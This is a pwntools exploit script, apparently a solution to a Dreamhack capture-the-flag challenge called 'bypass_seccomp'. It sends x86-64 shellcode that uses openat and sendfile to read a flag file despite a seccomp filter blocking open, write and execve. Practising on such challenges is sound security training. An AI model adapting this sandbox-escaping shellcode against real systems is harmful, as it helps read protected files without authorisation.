#!/usr/bin/env python3
from pwn import *

PORT = 17392
HOST = "host3.dreamhack.games"
elf = context.binary = ELF('./bypass_seccomp', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force

            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

sc = asm('''
    /* openat(AT_FDCWD, "flag", O_RDONLY, 0) */
    push 0x67616c66
    mov rsi, rsp
    mov edi, -100
    xor edx, edx
    mov eax, 257
    syscall

    /* sendfile(1, fd, NULL, 0x100) */
    mov esi, eax
    mov edi, 1
    xor edx, edx
    mov r10d, 0x100
    mov eax, 40
    syscall
''')


sa(b'shellcode: ', sc)

p.interactive()

# Kill syscall open, write, execve. read is approved 
# -> alternative solution is use openat + sendfile
# sendfile(1, fd, NULL, 0x100) will bring the content of file to stdout
